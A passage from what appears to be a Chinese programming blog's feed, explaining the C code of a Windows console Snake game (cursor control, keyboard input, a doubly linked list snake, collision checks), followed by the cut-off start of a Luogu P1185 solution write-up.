class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//涉及到windows的API</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color</span><span class="params">(<span class="type">int</span> i)</span> &#123;<span class="comment">//更改文字颜色</span></span><br><span class="line"><span class="comment">//SetConsoleTextAttribute是API设置控制台窗口字体颜色和背景色的函数</span></span><br><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//游戏中每次调用gotoxy时的参数都是根据游戏菜单字符位置/当前坐标计算好传递过来的</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">gotoxy</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">COORD c;</span><br><span class="line"><span class="type">static</span> HANDLE h;</span><br><span class="line">h = GetStdHandle(STD_OUTPUT_HANDLE);<span class="comment">//从标准设备获取句柄</span></span><br><span class="line">c.X = x;</span><br><span class="line">c.Y = y;</span><br><span class="line">SetConsoleCursorPosition(h, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">keyboard</span><span class="params">(<span class="type">int</span> pre)</span> &#123;<span class="comment">//键盘输入判断</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="type">int</span> n = pre;</span><br><span class="line"><span class="keyword">if</span> (_kbhit()) &#123;<span class="comment">//检查是否有键盘输入</span></span><br><span class="line">c = _getch();<span class="comment">//如果有,则进行一次读取</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;w&#x27;</span> || c == <span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;a&#x27;</span> || c == <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;s&#x27;</span> || c == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">n = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;d&#x27;</span> || c == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">n = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">n = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">rewind(<span class="built_in">stdin</span>);<span class="comment">//fflush(stdin); 刷新缓冲区,在VS2015之后不再起作用(编译成功但无效果)</span></span><br><span class="line"><span class="keyword">if</span> ((pre == <span class="number">1</span> &amp;&amp; n == <span class="number">3</span>) || (pre == <span class="number">2</span> &amp;&amp; n == <span class="number">4</span>) || (pre == <span class="number">3</span> &amp;&amp; n == <span class="number">1</span>) || (pre == <span class="number">4</span> &amp;&amp; n == <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> pre;<span class="comment">//如果键盘要求蛇180度转向,则转向失败,蛇仍然按照原来的方向前进</span></span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//成功转向,返回下一步前进的方向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="游戏逻辑—game-c"><a href="#游戏逻辑—game-c" class="headerlink" title="游戏逻辑—game.c"></a>游戏逻辑—game.c</h2><p>包含了所有的初始化操作,游戏运行逻辑,结算处理</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><h3 id="游戏主循环—start-函数"><a href="#游戏主循环—start-函数" class="headerlink" title="游戏主循环—start()函数"></a>游戏主循环—start()函数</h3><p>逻辑伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">print_tips(); <span class="comment">// 打印提示</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(againstTheWall() || againstSelf())&#123;</span><br><span class="line">            gameover();<span class="comment">//进行游戏结束的处理</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        print_score();</span><br><span class="line">        </span><br><span class="line">        snake_move(); <span class="comment">//包含有键盘输入的检测和处理,并在检测到暂停时修改pause_game的值</span></span><br><span class="line">        <span class="keyword">if</span>(eat_apple())&#123;</span><br><span class="line">            snake_growth(); <span class="comment">// 蛇长长</span></span><br><span class="line">            <span class="keyword">if</span> (SnakeLen == maxSnakeLen) &#123;</span><br><span class="line">                gamewin();<span class="comment">// 霸屏则游戏胜利</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            generate_new_apples(); <span class="comment">// 生成新苹果</span></span><br><span class="line">            score++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pause_game)&#123;</span><br><span class="line">            pause_the_game(); <span class="comment">//  暂停,直到检测到要求继续的键盘输入</span></span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(wait_time); <span class="comment">// 休眠一段时间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="游戏初始化"><a href="#游戏初始化" class="headerlink" title="游戏初始化"></a>游戏初始化</h3><h4 id="设置游戏难度—setDifficulty-函数"><a href="#设置游戏难度—setDifficulty-函数" class="headerlink" title="设置游戏难度—setDifficulty()函数"></a>设置游戏难度—setDifficulty()函数</h4><p>设置了5个难度,分别对应start()中不同的Sleep时间,以此来影响蛇移动的速度</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setDifficulty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, difficulties[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">1000</span>, <span class="number">800</span>, <span class="number">600</span>, <span class="number">400</span>, <span class="number">200</span>&#125;;<span class="comment">//5种游戏难度---对应不同的等待时间</span></span><br><span class="line">    <span class="comment">// 界面优化相关代码忽略</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输入处理</span></span><br><span class="line">    <span class="type">bool</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) &amp;&amp; n &gt; <span class="number">0</span> &amp;&amp; n &lt; <span class="number">6</span>)</span><br><span class="line">            flag = <span class="number">0</span>;<span class="comment">//输入成功则跳出循环</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入难度[1~5](按回车键确认):&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            rewind(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据输入调整游戏参数</span></span><br><span class="line">    <span class="comment">//wait = 1100 - n * 200; // 旧的调整方法</span></span><br><span class="line">    wait = difficulties[n];<span class="comment">//设置等待时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化分数</span></span><br><span class="line">    score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rewind(<span class="built_in">stdin</span>);<span class="comment">//刷新缓冲区</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//清屏</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打印界面—printBox-函数"><a href="#打印界面—printBox-函数" class="headerlink" title="打印界面—printBox()函数"></a>打印界面—printBox()函数</h4><p>关键是坐标的计算,要在正确的位置进行打印</p><p>使用”□”字符串进行地图的打印,<strong>因为该字符占用2字节,所以x坐标每次要+&#x3D;2而不是+&#x3D;1</strong></p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printBox</span><span class="params">()</span>&#123;</span><br><span class="line">set_map_size(); <span class="comment">// 设置地图大小,大小包括边界(WIDTH和HEIGHT变量,代码略)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//+=2的原因是方块字符并非ASCII字符,占用两个字节大小---坐标每次需要+2而不是+1</span></span><br><span class="line">    <span class="comment">//打印围墙</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; WIDTH * <span class="number">2</span>; i += <span class="number">2</span>) &#123;<span class="comment">//上下</span></span><br><span class="line">        gotoxy(i, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(i, HEIGHT - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= HEIGHT - <span class="number">1</span>; i++) &#123;<span class="comment">//左右</span></span><br><span class="line">        gotoxy(<span class="number">0</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(WIDTH * <span class="number">2</span> - <span class="number">2</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印盒子内部</span></span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= HEIGHT - <span class="number">2</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; WIDTH * <span class="number">2</span> - <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">            gotoxy(i, j);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="初始化蛇和苹果数据"><a href="#初始化蛇和苹果数据" class="headerlink" title="初始化蛇和苹果数据"></a>初始化蛇和苹果数据</h4><p>此处涉及到链表操作!</p><p>1.首先容易想到苹果只需要记录其x,y坐标即可</p><p>2.然后对于蛇,其行为有2种—向前移动一格而不增长,前进并增长一格</p><p>3.而且蛇的每一个结点的运动方向都不一定相同—因为蛇会拐弯</p><p>如果使用单链表,就需要对每一个结点保存其下次前进的方向,也就是要知道其前一个结点的坐标是在当前结点的哪个方向(上&#x2F;下&#x2F;左&#x2F;右)并进行存储,不仅浪费空间,而且频繁修改会导致效率低下</p><p>所以,这里使用双链表来实现,很容易找到前一个结点的坐标来确定移动方向</p><p>实际上这里的双链表实际只影响了当前的蛇尾,因为蛇的每一个节点都是相同的,所以前进仅需在蛇头前进方向新增一个蛇头结点作为新蛇头(代码实现实际上是在蛇头后添加一个蛇身结点),然后删除当前的最后一个结点,即蛇尾</p><p>由此为了效率还需使用一个尾指针tail来指向蛇尾(链表尾)</p><p>综上所述,我们要存储(初始化)的数据即为: </p><p>1.苹果的坐标结构体<br>2.一个带有头结点(直接作为蛇头)的双向链表<br>3.一个指向当前链表尾结点(蛇尾)的指针tail</p><p>同时该部分还要进行游戏刚开始的苹果(默认在地图左上角),蛇身(默认在苹果右边,初始长度为4)的打印</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initSnakeAndApple</span><span class="params">()</span>&#123;</span><br><span class="line">    make_a_snake(<span class="number">4</span>); <span class="comment">// 创建一条长度为4的蛇---即初始化一个双向链表,并设置尾指针</span></span><br><span class="line">    <span class="comment">// 同时要对蛇的每一个节点设置初始坐标</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置蛇的长度相关参数</span></span><br><span class="line">    curSnakeLen = <span class="number">4</span>;<span class="comment">//初始时蛇的长度为4</span></span><br><span class="line">    maxSnakeLen = (WIDTH - <span class="number">2</span>) * (HEIGHT - <span class="number">2</span>);<span class="comment">//根据地图大小计算游戏胜利蛇应该达到的长度</span></span><br><span class="line"></span><br><span class="line">    init_apple(<span class="number">8</span>,<span class="number">4</span>); <span class="comment">// 初始化苹果</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//因为代码实现是先无条件前进再进行吃到苹果的处理,所以蛇尾此时已移动,需要提前记录前一个蛇尾的位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇移动—moveSnake-函数"><a href="#蛇移动—moveSnake-函数" class="headerlink" title="蛇移动—moveSnake()函数"></a>蛇移动—moveSnake()函数</h3><p>因为蛇移动并没有长度变化,即蛇头增长,蛇尾缩短,所以直接把蛇尾结点移动到蛇头即可</p><p>对应到链表操作即为修改指针指向,将头结点之后的第一个蛇结点修改为蛇尾,蛇尾结点指向第二个蛇结点,然后倒数第二个结点后驱指向NULL</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">moveSnake</span><span class="params">(<span class="type">int</span> flag)</span> &#123;<span class="comment">//蛇的正常前进</span></span><br><span class="line">    <span class="type">int</span> move[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">-1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">-2</span>, <span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">2</span>,  <span class="number">0</span>&#125;</span><br><span class="line">    &#125;;<span class="comment">//4种不同的移动方向对应的4种坐标变换</span></span><br><span class="line">    flag--;<span class="comment">//对应move数组的元素--从下标0开始</span></span><br><span class="line">    <span class="comment">//保存蛇尾位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">    <span class="comment">//蛇尾,旧蛇头覆盖打印</span></span><br><span class="line">    gotoxy(tail-&gt;x, tail-&gt;y);</span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line"></span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">    <span class="comment">//蛇尾断开</span></span><br><span class="line">    snake *temp = tail;</span><br><span class="line">    tail = tail-&gt;prior;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//蛇尾结点作为新头,不需要删除创建,节省时间</span></span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    temp-&gt;prior = <span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;prior = temp;</span><br><span class="line">    head = temp;</span><br><span class="line">    <span class="comment">//新蛇头位置计算并打印</span></span><br><span class="line">    head-&gt;x = head-&gt;next-&gt;x + move[flag][<span class="number">0</span>];</span><br><span class="line">    head-&gt;y = head-&gt;next-&gt;y + move[flag][<span class="number">1</span>];</span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇长长—snakeGrowth-函数"><a href="#蛇长长—snakeGrowth-函数" class="headerlink" title="蛇长长—snakeGrowth()函数"></a>蛇长长—snakeGrowth()函数</h3><p>实际上是双向链表的尾插结点操作</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">snakeGrowth</span><span class="params">()</span> &#123;<span class="comment">//蛇的长度增长</span></span><br><span class="line">    <span class="comment">//新增蛇身结点---即在蛇尾新增一个结点并即刻打印(蛇此时已前进一格且吃到苹果</span></span><br><span class="line">    tail-&gt;next = (snake *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    tail-&gt;next-&gt;prior = tail;</span><br><span class="line">    tail = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    tail-&gt;x = pre_x;</span><br><span class="line">    tail-&gt;y = pre_y;</span><br><span class="line">    ++curSnakeLen;<span class="comment">//当前长度+1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印图像</span></span><br><span class="line">    gotoxy(pre_x, pre_y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);<span class="comment">//进行打印</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="吃到苹果的处理"><a href="#吃到苹果的处理" class="headerlink" title="吃到苹果的处理"></a>吃到苹果的处理</h3><p>要进行胜负判断苹果的重新生成和打印</p><h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码:"></a>关键代码:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行下一个苹果的生成(随机)</span></span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>) time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    apple.x = ((rand() % (WIDTH - <span class="number">2</span>)) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">    apple.y = (rand() % (HEIGHT - <span class="number">2</span>)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (isOverlap()); <span class="comment">// 直到苹果生成在正确的(没有生成在蛇身体上---需要对蛇的链表进行遍历)位置</span></span><br><span class="line">gotoxy(apple.x, apple.y); <span class="comment">// 跳转到该坐标并进行打印苹果</span></span><br><span class="line">color(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">score++; <span class="comment">// 分数+1</span></span><br></pre></td></tr></table></figure><h4 id="判断坐标是否正确—isOverlap-函数"><a href="#判断坐标是否正确—isOverlap-函数" class="headerlink" title="判断坐标是否正确—isOverlap()函数"></a>判断坐标是否正确—isOverlap()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isOverlap</span><span class="params">()</span> &#123;<span class="comment">// 检查新生成的苹果坐标是否和蛇身的任何一个部位重合</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">// 遍历蛇身链表</span></span><br><span class="line">        <span class="keyword">if</span> (apple.x == temp-&gt;x &amp;&amp; apple.y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="胜负判断—是否撞墙或是否撞到自己"><a href="#胜负判断—是否撞墙或是否撞到自己" class="headerlink" title="胜负判断—是否撞墙或是否撞到自己"></a>胜负判断—是否撞墙或是否撞到自己</h3><h4 id="是否撞墙—againstTheWall-函数"><a href="#是否撞墙—againstTheWall-函数" class="headerlink" title="是否撞墙—againstTheWall()函数"></a>是否撞墙—againstTheWall()函数</h4><p>只需要判断蛇头的坐标是否和边界重合</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstTheWall</span><span class="params">()</span> &#123;<span class="comment">//检查撞墙即检查蛇头的坐标是否和墙壁的坐标重合</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;x == <span class="number">0</span> || head-&gt;x == WIDTH * <span class="number">2</span> - <span class="number">2</span> ||</span><br><span class="line">        head-&gt;y == <span class="number">0</span> || head-&gt;y == HEIGHT - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="是否撞到自己—againstTheWall-函数"><a href="#是否撞到自己—againstTheWall-函数" class="headerlink" title="是否撞到自己—againstTheWall()函数"></a>是否撞到自己—againstTheWall()函数</h4><p>此时需要遍历整个链表(除了蛇头)来和蛇头的坐标进行比较</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstSelf</span><span class="params">()</span> &#123; <span class="comment">// 检查撞到自己即检查蛇头的坐标是否和任一蛇身的坐标重合</span></span><br><span class="line">    snake *temp = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123; <span class="comment">// 对链表进行遍历</span></span><br><span class="line">        <span class="keyword">if</span> (head-&gt;x == temp-&gt;x &amp;&amp; head-&gt;y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C C++ programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> console </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P1185</title>
      <link href="/2023/09/04/%E6%B4%9B%E8%B0%B7/P1185/"/>
      <url>/2023/09/04/%E6%B4%9B%E8%B0%B7/P1185/</url>
      
        <content type="html"><![CDATA[<p>首先先说一下最后一个测试点很多人RE的问题,我来了一张图:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/j76jqa31.png"><br>大概就是图里的那样…</p><p>下面是我的思路:<br>可能<del>稍微</del>复杂一点…</p><p>首先,题意我就不说了,关键在于每一层的边长度不同:<br>大佬们已经推出来这么个东西:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;</span><br></pre></td></tr></table></figure><p>其中f[i]就是高度为i的那一层到它上一层的边的长度(这里的高度指的是由下往上数的高度,为了方便我把最下边设为了1)<br>举个例子(样例)<img src="https://cdn.luogu.com.cn/upload/image_hosting/4ll725uh.png">:<br>也就是说f[i]存的就是第i层到第i-1层的边的长度(几个’&#x2F;‘或’\‘)</p><p>我是先把最下边一层先初始化弄进去,因为我不知道n,所以我从我开的画布数组最下边一行开始,从下往上:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 